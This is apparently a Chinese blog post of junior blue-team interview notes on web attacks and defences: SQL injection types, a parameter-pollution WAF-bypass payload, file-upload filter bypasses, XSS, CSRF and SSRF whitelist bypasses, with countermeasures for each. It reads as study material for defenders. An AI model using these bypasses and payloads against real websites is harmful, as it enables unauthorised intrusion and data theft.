<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>J1Nmu | J1Nmu</title><meta name="author" content="Jinmu"><meta name="copyright" content="Jinmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HW面试 蓝队初级面试  TOP10 失效的控制访问 —未授权 加密机制失效 shiro550硬编码 注入 不安全设计—apache弱口令 安全配置错误—php的文件上传 易受攻击和过时的组件—这个就是被公开过严重漏洞的组件 身份识别和身份验证错误—验证码 cookie 软件和数据完整性故障----"><link rel="shortcut icon" href="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg"><link rel="canonical" href="https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%9599/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'J1Nmu',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-18 09:48:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">J1Nmu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-12T04:57:58.000Z" title="发表于 2023-05-12 12:57:58">2023-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-18T01:48:06.800Z" title="更新于 2024-05-18 09:48:06">2024-05-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">37.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>125分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>HW面试</h1>
<h1>蓝队初级面试</h1>
<h2 id=""></h2>
<h2 id="TOP10">TOP10</h2>
<p>失效的控制访问 —未授权</p>
<p>加密机制失效 shiro550硬编码</p>
<p>注入</p>
<p>不安全设计—apache弱口令</p>
<p>安全配置错误—php的文件上传</p>
<p>易受攻击和过时的组件—这个就是被公开过严重漏洞的组件</p>
<p>身份识别和身份验证错误—验证码 cookie</p>
<p>软件和数据完整性故障----导致应用程序的运行代码受到篡改,github上之前有个人参加了开源项目在里面添加后门–</p>
<p><strong>安全日志和监控故障</strong>—安全日志出现故障,会导致被入侵时难以排查,或者日志文件被删除lsof|grep/var/log/secure可以找到被删除文件</p>
<p>服务器端请求伪造—SSRF</p>
<p>//////////</p>
<p>人工智能方面的SSRF ,AI投毒</p>
<h2 id="01-当你发现这个网站有CDN的时候应该怎么办">01.当你发现这个网站有CDN的时候应该怎么办?</h2>
<blockquote>
<p>CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。来自百度百科。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&gt;先观察网站是否有邮功能,比如注册的时候需要邮箱验证码，通过邮箱我们可以收集到其网站真实IP。</span><br><span class="line">2&gt;国外访问,很多CDN知识针对国内,在国外并没有部署,即使在国外部署,也不可能部署的那么全，比较容易搞到</span><br><span class="line">3&gt;查询域名解析记录,可能一开始公司做的比较小，没有CDN，后期才有了CDN,最开始的就是它的真实IP。</span><br><span class="line">4&gt;查询分站IP，大多数分站不会做CDN。</span><br></pre></td></tr></table></figure>
<h2 id="02-对哪些语言比较了解？">02.对哪些语言比较了解？</h2>
<p>PHP JS PYTHON ,JAVA之前学过,能看懂大概</p>
<h2 id="03-sql注入需要满足什么条件？">03.sql注入需要满足什么条件？</h2>
<p>​    <strong>SQL注入原理：</strong></p>
<blockquote>
<p><strong>通过某种方式将恶意的sql代码添加到输入参数中，然后传递到sql服务器使其解析并执行的一种攻击手法</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&gt;参数用户可控：前端传给后端的参数内容是用户可以控制的.</span><br><span class="line">2&gt;参数带入数据库查询：传入的参数直接拼接到SQL语句，且带入数据库查询.</span><br><span class="line">3&gt;数据库版本5.0以上也算一个吧,满足5.0以上才有information_schema</span><br></pre></td></tr></table></figure>
<h2 id="04-sql注入有哪几函数">04.sql注入有哪几函数</h2>
<h2 id="种类型？">种类型？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">首先想到的是最近看到的表情包注入,大概看了一眼应该只是绕过空格来用的</span><br><span class="line">1&gt;union联合注入</span><br><span class="line">2&gt;报错注入</span><br><span class="line">3&gt;堆叠注入</span><br><span class="line">4&gt;宽字节注入</span><br><span class="line">5&gt;XXF</span><br><span class="line">6&gt;Cookie</span><br><span class="line">7&gt;UA</span><br><span class="line">8&gt;万能密码</span><br><span class="line">9&gt;布尔盲注	(异或注入)</span><br><span class="line">10&gt;时间盲注 sleep() benchmark() 笛卡尔积 get_lock()加锁 rlike regexp正则匹配</span><br><span class="line">get_lock():限制条件就是数据库的连接必须是持久连接</span><br><span class="line">11&gt;二次注入</span><br><span class="line">12&gt;文件读写 load_file() into outfile</span><br></pre></td></tr></table></figure>
<h2 id="05-简单讲一下防范SQL注入的方法和原理">05.简单讲一下防范SQL注入的方法和原理</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&gt;预编译		(数据库不会将参数内容视为SQL命令执行,而是一个字段的属性值来处理,即提前编译SQL语句，将所有的用户输入都当做『数据』，而非『语法』)</span><br><span class="line">2&gt;PDO预处理	(本地和Mysql服务端使用字符集对输入进行转义)</span><br><span class="line">3&gt;正则表达式过滤(如果用户输入了非法信息则利用正则表达式过滤)</span><br></pre></td></tr></table></figure>
<h2 id="06-你在进行sql注入时，发现有waf-该怎么办？">06.你在进行sql注入时，发现有waf,该怎么办？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">尝试绕过</span><br><span class="line">1&gt;大小写</span><br><span class="line">2&gt;编码绕过</span><br><span class="line">3&gt;等价函数绕过 sleep==&gt;benchmark() </span><br><span class="line">4&gt;内联注释</span><br><span class="line">5&gt;参数污染</span><br></pre></td></tr></table></figure>
<p><code>参数污染</code></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Samforrest/p/15867628.html">https://www.cnblogs.com/Samforrest/p/15867628.html</a></p>
<h3 id="简介">简介</h3>
<p>http参数污染即HPP(HTTP Parameter Pollution)，是一种注入型漏洞，攻击者通过 在HTTP请求中插入特定的参数来发起攻击。如果web应用中存在这样的漏洞可以被攻击者利用来进行客户端或服务器端的攻击。</p>
<p>在sql注入的应用则是可以达到绕过sqlwaf的目的。</p>
<h3 id="原理">原理</h3>
<p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次</p>
<p>但是不同服务器的处理方式会不一样。有的会被覆盖,有的则不会覆盖并且都传入参数</p>
<p>必应:</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/sanmuforrest/images/raw/master/image/1644210782.png"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1644210782.png" alt="img"></a></p>
<p>对于同样的参数，必应会处理后一个参数</p>
<p>但是对于谷歌，会两个参数一起处理。</p>
<p>一些常见的web服务器对同样名称的参数出现多次的处理方式:</p>
<table>
<thead>
<tr>
<th style="text-align:left">Web服务器</th>
<th style="text-align:left">参数获取函数</th>
<th style="text-align:left">获取到的参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP/Apache</td>
<td style="text-align:left">$_GET(“par”)</td>
<td style="text-align:left">Last</td>
</tr>
<tr>
<td style="text-align:left">JSP/Tomcat</td>
<td style="text-align:left">Request.getParameter(“par”)</td>
<td style="text-align:left">First</td>
</tr>
<tr>
<td style="text-align:left">Perl(CGI)/Apache</td>
<td style="text-align:left">Param(“par”)</td>
<td style="text-align:left">First</td>
</tr>
<tr>
<td style="text-align:left">Python/Apache</td>
<td style="text-align:left">getvalue(“par”)</td>
<td style="text-align:left">All(list)</td>
</tr>
<tr>
<td style="text-align:left">ASP/IIS</td>
<td style="text-align:left">Request.QueryString(“par”)</td>
<td style="text-align:left">ALL(comma-delimited string)</td>
</tr>
</tbody>
</table>
<h3 id="应用">应用</h3>
<h4 id="waf绕过">waf绕过</h4>
<p>如果waf会将union给过滤掉，那么我们可以利用HHP绕过</p>
<p>如上传的参数为在特定情况下为<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code>如果服务器端是将获取到的参数组合的话，就可以达到绕过的目的。</p>
<p>组合起来就是<code>union select 1,user(),3</code></p>
<h2 id="07-SQL注入攻击有哪些危害？">07.SQL注入攻击有哪些危害？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&gt;获取数据库数据</span><br><span class="line">2&gt;网页篡改</span><br><span class="line">3&gt;网页挂马</span><br><span class="line">4&gt;更改数据库数据</span><br><span class="line">5&gt;获取服务器权限</span><br></pre></td></tr></table></figure>
<h2 id="08-文件上传有了解吗？">08.文件上传有了解吗？</h2>
<h3 id="1-原理"><strong>1&gt;原理:</strong>()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web页面的文件上传功能,没有对文件名后缀进行严格限制,导致攻击者可以上传能被服务器解析并执行的文件,并通过此文件获得执行服务端命令的能力,</span><br></pre></td></tr></table></figure>
<h3 id="2-利用思路"><strong>2&gt;利用思路:</strong></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规类:扫描获取上传,会员中心上传,后台系统上传以及各种途径上传.</span><br><span class="line">CMS类:已知CMS源码(上传.php.mod文件即主题文件.mod).</span><br><span class="line">编译器类：ckeditor、fckeditor、kindeditor、xxxxeditor。</span><br><span class="line">其他类/CVE：代码审计、平台/第三方应用。</span><br></pre></td></tr></table></figure>
<h3 id="3-危害"><strong>3&gt;危害:</strong>()</h3>
<p>能上传并行,基本上就getshell了,</p>
<p>上传webshell控制服务器远程命令执行,</p>
<p>上传系统病毒,木马文件进行挖矿,僵尸网络</p>
<p><strong>进行提权操作</strong></p>
<p><strong>修改web页面,实现钓鱼,挂马</strong></p>
<p><strong>进行内网渗透</strong></p>
<h3 id="4-绕过"><strong>4&gt;绕过:</strong></h3>
<p>修改前端js—bp绕过前端验证</p>
<p>修改文件类型参数</p>
<p>修改后缀名</p>
<p>.htaccess–apache解析文件</p>
<p>.user.ini</p>
<p>条件竞争</p>
<p><strong>图片马</strong></p>
<p><strong>GIF89A文件头欺骗</strong></p>
<p><strong>%00,0x00截断</strong></p>
<p><strong>二次渲染绕过</strong></p>
<p><strong>条件竞争绕过</strong>(将图片上传上去,才开始进行判断后缀名,二次渲染.)</p>
<p><strong>特殊可解析后缀绕过</strong>php1,php2,php3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PhP除了可以解析php后缀 还可以解析php1,php2，php3，php4 ，phtml等</span><br><span class="line">Asp可解析 	asa，cer,cdx</span><br><span class="line">Aspx可解析 ashx，asmx，ascx</span><br><span class="line">Jsp可解析 	jspx、jspf</span><br></pre></td></tr></table></figure>
<p><strong>点+空格+点绕过</strong></p>
<blockquote>
<p>某些情况下，源代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p>
</blockquote>
<p><strong>::$DATA绕过</strong></p>
<blockquote>
<p>在php代码中没有对::$DATA进行过滤，在windows中会将文件名::$DATA之后的数据当成文件流处理，保持::$DATA之前的文件名<br>
假设上传的文件为test9.php::$DATA.jpg，如果成功上传到服务器就会去掉::$DATA.jpg变成test9.php进行保存<br>
但是php代码中还通过strrchr函数获取文件后缀.jpg，并以该后缀作为上传之后的文件后缀<br>
所以test9.php::$DATA.jpg上传到服务器后缀仍然是.jpg</p>
</blockquote>
<h3 id="5-防范"><strong>5&gt;防范:</strong>()</h3>
<ul>
<li>文件上传的目录设置为不可执行</li>
</ul>
<blockquote>
<p>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
</blockquote>
<ul>
<li>严格判断文件类型</li>
</ul>
<blockquote>
<p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
</blockquote>
<ul>
<li>使用随机数修改文件名和文件路径</li>
</ul>
<blockquote>
<p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p>
</blockquote>
<ul>
<li>单独设置文件服务器的域名</li>
</ul>
<blockquote>
<p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p>
</blockquote>
<ul>
<li>内容检测</li>
</ul>
<blockquote>
<p>有效防范图片马和文件二次渲染</p>
</blockquote>
<ul>
<li>安全加固中间件</li>
</ul>
<blockquote>
<p>及时更新并加固中间件，可以有效避免因为中间件的漏洞而导致的文件上传漏洞，比如某些中间件以前的版本很多都具有文件解析漏洞</p>
</blockquote>
<ul>
<li>采用WAF等安全防护设备</li>
</ul>
<blockquote>
<p>采用WAF等安全防护设备可以有效的防御常见漏洞</p>
</blockquote>
<h2 id="09-XSS攻击有了解吗？">09.XSS攻击有了解吗？</h2>
<h3 id="1-有了解-原理"><strong>1&gt;有了解,原理:</strong></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss攻击就是攻击者在web页面中插入恶意代码,而程序对于用户输入的内容未进行过滤.</span><br></pre></td></tr></table></figure>
<h3 id="2-类型"><strong>2&gt;类型:</strong>()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反射型,</span><br><span class="line">存储型,</span><br><span class="line">DOM型(Document Object Model)即文档对象模型，是HTML和XML文档的编程接口。 </span><br></pre></td></tr></table></figure>
<h3 id="3-危害-2"><strong>3&gt;危害:</strong></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">盗取cookie,替换cookie成功以管理员的身份进入后台</span><br><span class="line">利用[浏览器的同源策略](https://www.jianshu.com/p/8aa9474a148c)</span><br><span class="line">同源的定义：如果两个页面的协议，端口和主机都相同，则两个页面具有相同的源。Cookie：只有同源的网页才能共享，但是若两个页面一级域名相同，只是二级域名不同，那么浏览器可以通过设置document.domain来共享Cookie。</span><br><span class="line">进入后台第一件事：找上传点！</span><br><span class="line">看看自己是什么权限</span><br><span class="line">试一下能不能弹shell到msf</span><br><span class="line">看看有没有域环境,尝试横向渗透</span><br><span class="line">屏幕截屏,</span><br><span class="line">键盘记录,</span><br><span class="line">配合其他工具(Metasploit)获取服务器权限,</span><br><span class="line">重定向(植入广告,恶意链接),</span><br><span class="line">网页钓鱼(水坑攻击),</span><br><span class="line">网页挂马(可以控制对方主机)</span><br></pre></td></tr></table></figure>
<h3 id="4-防护"><strong>4&gt;防护:</strong>()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">特殊字符HTML实体转化,</span><br><span class="line">设置标签属性黑名单,</span><br><span class="line">加入httponly(防止窃取cookie),js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击</span><br></pre></td></tr></table></figure>
<h2 id="10-CSRF-跨站请求伪造-–未授权登录">10.CSRF(跨站请求伪造)–未授权登录</h2>
<h3 id="1-原理-2"><strong>1&gt;原理:</strong>()</h3>
<blockquote>
<p>利用浏览器对用户的信任进行攻击</p>
</blockquote>
<p>web应用程序在用户进行敏感操作时,入修改账户密码,添加账户等没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p>
<blockquote>
<p>受害者A登录网站，攻击者B构造有效链接诱导受害者A访问，网站在线期间会将该请求当做正常业务执行。(比如修改密码，向某用户转账等业务，当然现在这种简单的EXP基本上见不到，拿靶场验证一下用于理解原理就行了)</p>
</blockquote>
<h3 id="2-类型-2">2&gt;类型:</h3>
<ul>
<li><strong>GET类型</strong></li>
<li><strong>POST类型</strong></li>
</ul>
<blockquote>
<p>比如在一个页面中构造好一个表单表单，将这个页面隐藏在一个不可见的iframe窗口中，然后使用JavaScript自动提交这个表单，在整个过程中，对于用户来说是不可见的。当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作</p>
</blockquote>
<h3 id="3-危害-3">3&gt;危害:</h3>
<ul>
<li>盗用其他用户或者管理员的账户</li>
<li>获取个人隐私或者机密资料</li>
<li>联合其他漏洞组合拳</li>
</ul>
<blockquote>
<p>比如说拿到管理员账号之后，我们在某个页面利用XSS漏洞进行网页挂马，普通用户访问后就会下载木马程序，进而联合MSF或者CS等工具getshell。再比如说你把管理员密码还原一下，真正管理员登录的时候也会受到网页挂马的影响，结合工具可以进一步拿下管理员主机权限。</p>
</blockquote>
<h3 id="4-防范措施">4&gt;防范措施</h3>
<ul>
<li><strong>验证码验证</strong></li>
</ul>
<blockquote>
<p>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。</p>
<p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，对用户执行敏感操作时进行验证，就能够很好地遏制CSRF攻击。</p>
<p>但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
</blockquote>
<ul>
<li><strong>在请求地址中添加 token 并验证</strong></li>
</ul>
<blockquote>
<p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。</p>
<p>要抵御 CSRF关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。</p>
<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
</blockquote>
<ul>
<li><strong>验证 HTTP头的Referer 字段</strong></li>
</ul>
<blockquote>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，头信息里会包含Referer。</p>
<p><a target="_blank" rel="noopener" href="http://xn--www-lp6en1iv9r0tq.google.com">比如我在www.google.com</a> 里有一个**<code>www.baidu.com</code>** 链接，那么点击这个链接，它的头信息里就会有：</p>
<p>Referer=<a target="_blank" rel="noopener" href="http://www.google.com">http://www.google.com</a></p>
<p>通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
</blockquote>
<ul>
<li><strong>在 HTTP 头中自定义属性并验证</strong></li>
</ul>
<blockquote>
<p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
<p>缺陷是要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，就意味着可能要重写整个网站，这代价无疑是不能接受的。</p>
</blockquote>
<h2 id="11-SSRF有了解吗">11.SSRF有了解吗?</h2>
<h3 id="1-原理-3">1&gt;原理:()</h3>
<p>ssrf是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
<h3 id="2-SSRF利用点">2&gt;SSRF利用点()</h3>
<ol>
<li>分享：通过 url 地址分享网页内容</li>
<li>转码服务：通过 url 地址把原地址的网页内容调优使其适合收集屏幕浏览</li>
<li>在线翻译：他弄个 url 地址翻译对应文本的内容，比如百度翻译，有道等</li>
<li>图片加载与下载：通过指定 url 地址加载或者下载图片</li>
<li>图片文章的收藏功能：从分享的 url 中读取原文的标题等</li>
<li>从未公开的 api 实现以及其他调用 url 的功能</li>
<li>ssrf 漏洞验证</li>
<li>ssrf 利用方式</li>
<li>本地利用</li>
<li>远程利用</li>
<li>探测内网</li>
<li>攻击 Redis 服务</li>
<li>攻击 Mysql 服务</li>
</ol>
<h3 id="3-绕过">3&gt;绕过:()</h3>
<p><strong>利用@绕过限制白名单域名</strong></p>
<p>利用@，当网站限制只能访问 <code>http://www.xxx.com</code>类型的域名时，可以采用http基本身份认证的方式绕过，如：<a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com">http://www.xxx.com@www.xxc.com</a></p>
<p><strong>绕过限制白名单内网IP</strong></p>
<ul>
<li>采用短网址绕过</li>
